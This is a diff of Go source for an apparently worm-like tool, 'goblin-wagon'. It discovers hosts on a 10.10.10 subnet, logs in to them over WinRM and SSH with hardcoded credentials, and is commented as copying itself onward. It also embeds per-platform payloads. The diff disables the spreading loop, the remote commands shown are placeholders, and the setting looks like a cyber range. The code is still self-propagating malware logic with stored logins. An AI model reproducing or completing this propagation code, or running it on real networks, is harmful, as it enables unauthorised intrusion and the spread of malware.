@@ -2,12 +2,12 @@ package main
 
 import (
 	_ "embed"
-    "os"
+    // "os"
     "os/exec"
 	"context"
 	"fmt"
 	"io"
-	"net"
+	// "net"
 	"runtime"
 	"sync"
 	"unicode"
@@ -146,39 +146,39 @@ func spread() {
 		exclusion_map[ip] = true
 	}
 
-	target_hosts := reverse_lookup_hosts("10.10.10")
+	// target_hosts := reverse_lookup_hosts("10.10.10")
 
-	for _, host_ip := range target_hosts {
+	// for _, host_ip := range target_hosts {
 
-		// Skip IPs that are not in target scope
-		if exclusion_map[host_ip] {
-			continue
-		}
+	// 	// Skip IPs that are not in target scope
+	// 	if exclusion_map[host_ip] {
+	// 		continue
+	// 	}
 
-		// ********************************************
-		// Brute force connect to IPs via SSH or WinRM
-		// ********************************************
+	// 	// ********************************************
+	// 	// Brute force connect to IPs via SSH or WinRM
+	// 	// ********************************************
 
-		// WinRM
-		winrm_client, err := establish_winRM(host_ip, "sjohnson", "UwU?OwO!67")
-		if err != nil {
-			fmt.Println("Failed to WinRM to: " + host_ip)
-		}
+	// 	// WinRM
+	// 	winrm_client, err := establish_winRM(host_ip, "sjohnson", "UwU?OwO!67")
+	// 	if err != nil {
+	// 		fmt.Println("Failed to WinRM to: " + host_ip)
+	// 	}
 
-		// Command to copy itself to new host
-		run_WinRM_cmds(winrm_client, "ipconfig")
+	// 	// Command to copy itself to new host
+	// 	run_WinRM_cmds(winrm_client, "ipconfig")
 
-		// SSH
-		ssh_client, err := establish_SSH(host_ip, "cyberrange", "Cyberrange123!")
-		if err != nil {
-			fmt.Println("Failed to SSH to: " + host_ip) // debugging
-		}
-		defer ssh_client.Close()
+	// 	// SSH
+	// 	ssh_client, err := establish_SSH(host_ip, "cyberrange", "Cyberrange123!")
+	// 	if err != nil {
+	// 		fmt.Println("Failed to SSH to: " + host_ip) // debugging
+	// 	}
+	// 	defer ssh_client.Close()
 
-		// Command to copy itself to new host
-		run_SSH_cmds(ssh_client, "echo hi")
+	// 	// Command to copy itself to new host
+	// 	run_SSH_cmds(ssh_client, "echo hi")
 
-	} 
+	// } 
 
 }
 
@@ -201,7 +201,7 @@ var payload_windows_386 []byte
 var payload_windows_arm64 []byte
 
 func main() {
-	discover_hosts("10.10.10")
+	fmt.Println(discover_hosts("10.10.10"))
     // log.SetFlags(log.Ltime | log.Lshortfile)
     // log.Println("[*] goblin-wagon starting")
 
